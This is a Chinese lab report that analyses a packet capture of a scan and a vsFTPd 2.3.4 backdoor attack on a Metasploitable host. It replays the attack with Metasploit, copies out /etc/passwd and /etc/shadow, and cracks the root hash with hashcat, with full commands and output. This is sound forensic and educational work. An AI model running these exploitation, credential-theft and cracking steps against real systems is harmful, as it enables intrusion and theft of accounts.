# 1. 分析过程

- 首先观察流量统计，发现`192.168.2.222`与`192.168.2.183`的流量最大且数量相近，`Burst Rate`和`Burst Start`也完全相同，因此初步推测这两个`IP`对应攻击机与靶机：

![1.1-流量分析](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281632834.png)

- 使用过滤规则`ip.addr == 192.168.2.222 and ip.addr == 192.168.2.183`对这两个`IP`之间的报文进行过滤，观察过滤结果，可得到`192.168.2.222`对应的`MAC`地址为`00:0c:29:2f:4c:7a`，`192.168.2.183`对应的`MAC`地址为`08:00:27:e6:16:43`，且后者具有域名`kali.lan`：

![1.2-报文过滤](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281638475.png)

- 分析过滤结果，数据包`72`到数据包`2261`，`192.168.2.183`不断地通过`54547`端口向`192.168.2.222`的各个常用端口发送`TCP SYN`数据包，`192.168.2.222`的大部分端口都返回一个`TCP RST`数据包，之后此次`TCP`连接尝试结束，如`1723`、`113`、`587`等端口，这说明`192.168.2.222`的这些端口是关闭的：

![1.3-关闭端口](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281659299.png)

- `192.168.2.222`的一些端口返回一个`TCP SYN/ACK`数据包，之后`192.168.2.183`向`192.168.2.222`对应端口发送`TCP RST`报文，此次`TCP`连接尝试结束，如`445（对应数据包82、83、92，流5）`、`139（对应数据包88、89、93，流8）`、`111（对应数据包96、97、104，流11）`等端口，这说明`192.168.2.222`的这些端口是开放的：

![1.4-开放端口1](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281702547.png)

![1.5-开放端口2](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281702124.png)

![1.6-开放端口3](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281702998.png)

- 根据以上信息，可推测`数据包72 ~ 数据包2261 (流0 ~ 1082)`中`192.168.2.183`对`192.168.2.222`进行了`SYN`扫描，据此推测`192.168.2.183`为攻击机，`192.168.2.222`为靶机，以下分别用攻击机和靶机代表双方；
- 继续分析数据包，`数据包2268 ~ 数据包2356`的部分数据包中`(流1083)`，攻击机与靶机的`21`号端口的`FTP`服务建立连接，追踪`TCP`流如下，可知靶机的`FTP`服务使用的是`vsFTPd 2.3.4`，之后连接关闭：

![1.7-FTP连接](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281708775.png)

![1.8-FTP连接流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281715668.png)

- `数据包2270 ~ 数据包2359`的部分数据包中`(流1084)`，攻击机与靶机的`22`号端口的`ssh`服务建立连接，追踪`TCP`流如下，可知靶机的`SSH`服务使用的是`SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1`，之后连接关闭：

![1.9-SSH连接](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281709196.png)

![1.10-SSH连接流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281716523.png)

- `数据包2272 ~ 数据包2380`的部分数据包中`(流1085)`，攻击机与靶机的`23`号端口的`telnet`服务建立连接，追踪`TCP`流如下，之后连接关闭：

![1.11-TELNET连接](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281716656.png)

![1.12-TELNET连接流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281716237.png)

- `数据包2276 ~ 数据包2406`的部分数据包中`(流1086)`，攻击机与靶机的`25`号端口的`SMTP`服务建立连接，追踪`TCP`流如下，之后连接关闭：

![1.13-SMTP连接](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281716231.png)

![1.14-SMTP连接流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281716427.png)

- `数据包2279 ~ 数据包2494`的部分数据包中`(流1087)`，攻击机与靶机的`53`号端口的`DNS`服务建立连接，追踪`TCP`流如下，可知靶机的`DNS`服务使用的是`bind 9.4.2`，之后连接关闭：

![1.15-DNS连接](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281717402.png)

![1.16-DNS连接流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281717286.png)

- 攻击机接下来持续与靶机中开放的端口建立`TCP`连接`(流1088 ~ 流1190)`，推测是对之前扫描到的靶机上开放的端口进行服务版本扫描。其中`流1110 ~ 流1135中的大部分和流1177`对`513`号端口的`rlogin`服务进行扫描，`流1136 ~ 流1175中的大部分`对`512`号端口的`exec`服务进行扫描，其他流还对`SMB(流1137)`、`HTTP(流1138、1176、1178、1189、1190)`、`AJP13(流1139、1140)`、`RSH(流1179)`、`PORTMAP(流1180、1181)`、`RSTAT(流1182)`、`SMUX(流1183)`、`RPC(流1184)`、`NFS(流1185、1186、1187)`等服务进行了扫描。
- `数据包2279 ~ 数据包2494`的部分数据包中`(流1193)`，攻击机与靶机的`FTP`服务建立了连接，且用户名为`CbNDRk:)`，密码为`d6`，观察用户名，猜测使用了`vsFTPd v2.3.4 backdoor`漏洞，之后该连接没有再进行其他通信，直到超时退出：

![1.17-FTP攻击](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281722215.png)

![1.18-FTP攻击流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281722165.png)

- 经过查询`vsFTPd v2.3.4 backdoor`[漏洞信息](https://subscription.packtpub.com/book/networking-and-servers/9781786463166/1/ch01lvl1sec18/vulnerability-analysis-of-vsftpd-2-3-4-backdoor)可知对于以`:)`结尾的用户名和任意密码，`vsFTPd v2.3.4`会开启`6200`端口并在此端口开启具有`root`权限的后门`shell`：

![1.19-攻击原理](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281728901.png)

- 在建立以上`FTP`连接前，攻击机尝试与靶机的`6200`端口进行连接`(流1192)`，但此时攻击尚未进行，靶机的`6200`端口处于关闭状态，连接未建立：

![1.20-攻击前尝试连接6200端口](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281732733.png)

- 在建立以上`FTP`连接后，攻击机再次尝试与靶机的`6200`端口进行连接`(流1194)`，此次连接成功，攻击机获得靶机的具有`root`权限的`shell`，之后攻击机使用该`shell`执行了以下指令（关键命令）：
  - `id`：查看当前用户为`root`，所在组为`root`；
  - `nohup  >/dev/null 2>&1`：`nohup`的[基本功能](https://www.linuxfordevices.com/tutorials/linux/nohup-command)为在忽略挂起信号的状态下运行给定命令，但该指令没有给出具体要执行的指令，且将标准输出和标准错误丢弃，因此运行该指令没有任何结果；
  - `uname -a`：查看靶机信息；
  - `whoami`：查看当前用户为`root`；
  - `adduser newuser`：添加一个用户`newuser`，对应口令为`anewuser`；
  - `cd /home/newuser && tar czvf user.tgz /etc/passwd /etc/shadow`：将`/etc/passwd`和`/etc/shadow`压缩至`/home/newuser/user.tgz`中；
  - `chmod 644 user.tgz`：更改`user.tgz`文件的权限为`644`；
  - `vi /home/newuser/hello.sh`：创建了`hello.sh`文件，输入了`#!/bin/sh`，但没有保存；
  - `exit`：退出`shell`；


```shell
id
uid=0(root) gid=0(root)
nohup  >/dev/null 2>&1
echo KAKSoVtXxY7SStzs
KAKSoVtXxY7SStzs
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
whoami
root
adduser newuser
Adding user `newuser' ...
Adding new group `newuser' (1004) ...
Adding new user `newuser' (1004) with group `newuser' ...
The home directory `/home/newuser' already exists.  Not copying from `/etc/skel'.
Enter new UNIX password: anewuser
Retype new UNIX password: anewuser
passwd: password updated successfully
Changing the user information for newuser
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
y
Is the information correct? [y/N] y
sh: line 7: y: command not found
cd /home/newuser
tar czvf user.tgz /etc/passwd /etc/shadow
tar: Removing leading `/' from member names
/etc/passwd
/etc/shadow
ls
test.sh
user.tgz
ls -l
total 8
-rwxr-xr-x 1 newuser newuser   31 May  4 23:38 test.sh
-rw------- 1 root    root    1311 May  5 00:08 user.tgz
chmod 644 user.tgz
vi /home/newuser/hello.sh
Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal
.[1;24r.[?25h.[?8c.[?25h.[?0c.[27m.[24m.[0m.[H.[J.[?25l.[?1c.[24;1H"/home/newuser/hello.sh" [New File].[2;1H.[1m.[34m~                                                                               .[3;1H~                                                                               .[4;1H~                                                                               .[5;1H~                                                                               .[6;1H~                                                                               .[7;1H~                                                                               .[8;1H~                                                                               .[9;1H~                                                                               .[10;1H~                                                                               .[11;1H~                                                                               .[12;1H~                                                                               .[13;1H~                                                                               .[14;1H~                                                                               .[15;1H~                                                                               .[16;1H~                                                                               .[17;1H~                                                                               .[18;1H~                                                                               .[19;1H~                                                                               .[20;1H~                                                                               .[21;1H~                                                                               .[22;1H~                                                                               .[23;1H~                                                                               .[1;1H.[?25h.[?0ci#!/bin/sh.h.:q.:q!
.[?25l.[?1c.[0m#!/bin/sh..[?25h.[?0c...[?25l.[?1c.[24;1H.[K.[24;1H:q
.[1m.[37m.[41mE37: No write since last change (add ! to override).[1;8H.[?25h.[?0c.[?25l.[?1c.[0m.[24;1H.[K.[24;1H:q!
.[?25h.[?0c.[24;1H.[K.[24;1H:q!
sh: line 14: :q!: command not found
quit
sh: line 15: quit: command not found
:q!
sh: line 16: :q!: command not found
ls
test.sh
user.tgz
quit
sh: line 18: quit: command not found
exit
```

![1.21-攻击后连接后门端口](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281733127.png)

![1.22-后门流1](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281735268.png)

![1.23-后门流2](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281735357.png)

- 根据以上`FTP`连接和两次对`6200`端口的连接及时间可以推测对漏洞使用了攻击脚本，而不是手动进行攻击，推测使用的是`Metasploit`中的`exploit/unix/ftp/vsftpd_234_backdoor`攻击脚本。
- 在上述创建好`user.tgz`文件并查看后`(数据包4365,对应时间为433.746777)`，攻击机再次与靶机建立`FTP`连接`(流1195)`，此次使用以上添加的用户`newuser`进行登录，并且从靶机下载了上述步骤中生成的`user.tgz`文件，第一次下载失败`(数据包4489,对应时间为477.478524)`，结合在`6200`端口上的操作可以推测，下载失败可能是没有用户`newuser`读权限导致的，因此在`shell`内修改了该文件的权限使得`newuser`具有读取权限`(数据包4545,对应时间为498.729666)`，之后再次进行下载，此次下载成功：

  - 数据包`4365`，此时`user.tgz`已被创建并查看：

  ![1.26-创建并查看](https://raw.githubusercontent.com/BIIIANG/pic/main/202204282330846.png)

  - 数据包`4489`，此时第一次下载尝试失败：

  ![1.27-第一次下载](https://raw.githubusercontent.com/BIIIANG/pic/main/202204292216721.png)

  - 数据包`4545`，此时修改`user.tgz`的读权限：

  ![1.28-修改读权限](https://raw.githubusercontent.com/BIIIANG/pic/main/202204282330159.png)

  - 数据包`4569`，此时第二次下载成功：

  ![1.29-第二次下载](https://raw.githubusercontent.com/BIIIANG/pic/main/202204282331069.png)

- 以下为下载过程的`FTP`连接：

```
220 (vsFTPd 2.3.4)
USER newuser
331 Please specify the password.
PASS anewuser
230 Login successful.
SYST
215 UNIX Type: L8
TYPE I
200 Switching to Binary mode.
PORT 192,168,2,183,157,31
200 PORT command successful. Consider using PASV.
RETR user.tgz
550 Failed to open file.
PORT 192,168,2,183,236,171
200 PORT command successful. Consider using PASV.
RETR user.tgz
150 Opening BINARY mode data connection for user.tgz (1311 bytes).
226 Transfer complete.
QUIT
221 Goodbye.
```

![1.24-FTP下载](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281739645.png)

![1.25-FTP下载流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281739102.png)

- 过滤`FTP DATA`流，可获得`user.tgz`的二进制内容`(流1196)`，将其以原始数据保存至本地的`user.tgz`，解压即可得到攻击者获得的靶机的`/etc/passwd`和`/etc/shadow`文件：

![1.30-FTP DATA](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281743934.png)

![1.31-FTP DATA流](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281743812.png)

![1.32-解压得到的passwd和shadow文件](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281744197.png)

- 攻击结束，获得了靶机的`/etc/passwd`和`/etc/shadow`文件，可使用相关内容进一步破解口令。
<div STYLE="page-break-after: always;"></div>

# 2.攻击主机信息

- 攻击主机`IP`：`192.168.2.183`；
- 攻击主机`MAC`：`08:00:27:e6:16:43`；
- 攻击主机域名：`kali.lan`；
- 攻击主机使用的端口：`54547`、`32884`、`52187`等。
<div STYLE="page-break-after: always;"></div>

# 3. 攻击步骤还原

- 以下攻击步骤剔除了攻击过程中的无效操作（如一些无效的指令），仅展示关键操作，攻击主机为`192.168.2.193`，靶机为`192.168.2.110`，攻击步骤复现过程中抓取的数据包见附件`Reappearance.pcapng`。
- 首先对靶机`192.168.2.110`进行端口扫描和版本侦测：
  - 根据扫描的端口从`21`到`8180`，猜测使用的是默认端口；
  - 有对服务版本的检测，因此使用`-sV`；

```shell
[12:21:03] xubiang:EXP2 $ sudo nmap -Pn -sV 192.168.2.110
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-28 12:21 EDT
Nmap scan report for 192.168.2.110
Host is up (0.0027s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec?
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:0C:29:BE:4B:8B (VMware)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.83 seconds
```

![2.1-扫描](https://raw.githubusercontent.com/BIIIANG/pic/main/202204290044183.png)

- 之后使用`Metasploit`中的`exploit/unix/ftp/vsftpd_234_backdoor`攻击脚本进行攻击，并通过`shell`进行一系列操作（去除无效操作），以下为模拟操作：

```shell
[12:24:33] xubiang:EXP1 $ msfconsole
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.1.27-dev                          ]
+ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Search can apply complex filters such as 
search cve:2009 type:exploit, see all the filters 
with help search

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.2.110
RHOST => 192.168.2.110
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.2.110:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.2.110:21 - USER: 331 Please specify the password.
[+] 192.168.2.110:21 - Backdoor service has been spawned, handling...
[+] 192.168.2.110:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.2.193:42219 -> 192.168.2.110:6200 ) at 2022-04-28 12:25:13 -0400

id
uid=0(root) gid=0(root)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
whoami
root
adduser newuser
Adding user `newuser' ...
Adding new group `newuser' (1003) ...
Adding new user `newuser' (1003) with group `newuser' ...
Creating home directory `/home/newuser' ...
Copying files from `/etc/skel' ...
Enter new UNIX password: anewuser
Retype new UNIX password: anewuser
passwd: password updated successfully
Changing the user information for newuser
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
y
Is the information correct? [y/N] y
sh: line 10: y: command not found
cd /home/newuser
tar czvf user.tgz /etc/passwd /etc/shadow
tar: Removing leading `/' from member names
/etc/passwd
/etc/shadow
```

![2.2-攻击1](https://raw.githubusercontent.com/BIIIANG/pic/main/202204290044610.png)

![2.3-攻击2](https://raw.githubusercontent.com/BIIIANG/pic/main/202204290044570.png)

- 之后在一个新的终端与靶机建立`FTP`连接，并下载`user.tgz`文件，此次下载失败：

```shell
[12:26:20] xubiang:EXP2 $ ftp 192.168.2.110
Connected to 192.168.2.110.
220 (vsFTPd 2.3.4)
Name (192.168.2.110:xubiang): newuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> system
215 UNIX Type: L8
ftp> binary
200 Switching to Binary mode.
ftp> get user.tgz
local: user.tgz remote: user.tgz
229 Entering Extended Passive Mode (|||50156|).
550 Failed to open file.
```

![2.6-下载1](https://raw.githubusercontent.com/BIIIANG/pic/main/202204290044002.png)

- 此时由于权限错误，回到`Metasploit`中得到的`shell`窗口，修改文件的权限：

```shell
chmod 644 user.tgz
```

![2.4-攻击3](https://raw.githubusercontent.com/BIIIANG/pic/main/202204290044725.png)

- 修改权限后，返回`FTP`终端，再次下载`user.tgz`文件，此次下载成功：

```shell
ftp> get user.tgz
local: user.tgz remote: user.tgz
229 Entering Extended Passive Mode (|||47042|).
150 Opening BINARY mode data connection for user.tgz (1267 bytes).
100% |**************************************************************************|  1267       22.37 MiB/s    00:00 ETA
226 Transfer complete.
1267 bytes received in 00:00 (1.04 MiB/s)
ftp> bye
221 Goodbye.
```

![2.7-下载2](https://raw.githubusercontent.com/BIIIANG/pic/main/202204290044794.png)

- 返回`Metasploit`中得到的`shell`窗口，退出`shell`：

```shell
exit
[*] 192.168.2.110 - Command shell session 1 closed.
```

![2.5-攻击4](https://raw.githubusercontent.com/BIIIANG/pic/main/202204290044442.png)

- 至此，攻击步骤还原完毕，得到了`user.tgz`文件。

![2.8-结果](https://raw.githubusercontent.com/BIIIANG/pic/main/202204290046702.png)

<div STYLE="page-break-after: always;"></div>

# 4. 破解口令

- 查看`/etc/shadow`文件中`root`对应条目为：`root:$1$AEvN/LAF$UE4aDFyWJa.AzVZkDnflq0:18387:0:99999:7:::`：

![4.1-密文内容](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281641541.png)

- `/etc/shadow`文件格式及`hashcat`使用见`实验一 6.1 /etc/shadow文件的格式`及`实验一 附录2 HASHCAT`；
  - 加密模式：根据`$1$`可知，口令使用`MD5`加密，因此模式应为`500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) | Operating System`；
  - 攻击模式：`3 | Send hashed passwords and attack positions`；
  - 密文文件：将`root`对应的口令密文`$1$AEvN/LAF$UE4aDFyWJa.AzVZkDnflq0`存储在`.\cyphertext\root2.txt`中；
  - 已知密码长度为`8`位，均为小写字母，且后三位为`msf`，因此使用模板`?l?l?l?l?lmsf`；
- 使用以下命令进行破解，可知口令为`adminmsf`：

```powershell
➜ .\hashcat --hash-type 500 --attack-mode 3 .\cyphertext\root2.txt ?l?l?l?l?lmsf
hashcat (v6.2.0) starting...

Successfully initialized NVIDIA CUDA library.

Failed to initialize NVIDIA RTC library.

* Device #1: CUDA SDK Toolkit installation NOT detected or incorrectly installed.
             CUDA SDK Toolkit installation required for proper device support and utilization
             Falling back to OpenCL Runtime

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: Unstable OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

* Device #3: Unstable OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

nvmlDeviceGetFanSpeed(): Not Supported

OpenCL API (OpenCL 3.0 CUDA 11.6.127) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: NVIDIA GeForce GTX 1050 Ti, 3584/4095 MB (1023 MB allocatable), 6MCU

OpenCL API (OpenCL 2.1 ) - Platform #2 [Intel(R) Corporation]
=============================================================
* Device #2: Intel(R) UHD Graphics 630, skipped
* Device #3: Intel(R) UHD Graphics 630, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Brute-Force

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 105 MB

$1$AEvN/LAF$UE4aDFyWJa.AzVZkDnflq0:adminmsf

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$AEvN/LAF$UE4aDFyWJa.AzVZkDnflq0
Time.Started.....: Thu Apr 28 15:49:23 2022 (0 secs)
Time.Estimated...: Thu Apr 28 15:49:23 2022 (0 secs)
Guess.Mask.......: ?l?l?l?l?lmsf [8]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   338.8 kH/s (8.87ms) @ Accel:4 Loops:125 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 122880/11881376 (1.03%)
Rejected.........: 0/122880 (0.00%)
Restore.Point....: 0/456976 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:4-5 Iteration:875-1000
Candidates.#1....: aariemsf -> arlmomsf
Hardware.Mon.#1..: Temp: 47c Util: 99% Core: 924MHz Mem:3504MHz Bus:16

Started: Thu Apr 28 15:49:18 2022
Stopped: Thu Apr 28 15:49:24 2022
```

![4.2-解密结果](https://raw.githubusercontent.com/BIIIANG/pic/main/202204281642803.png)
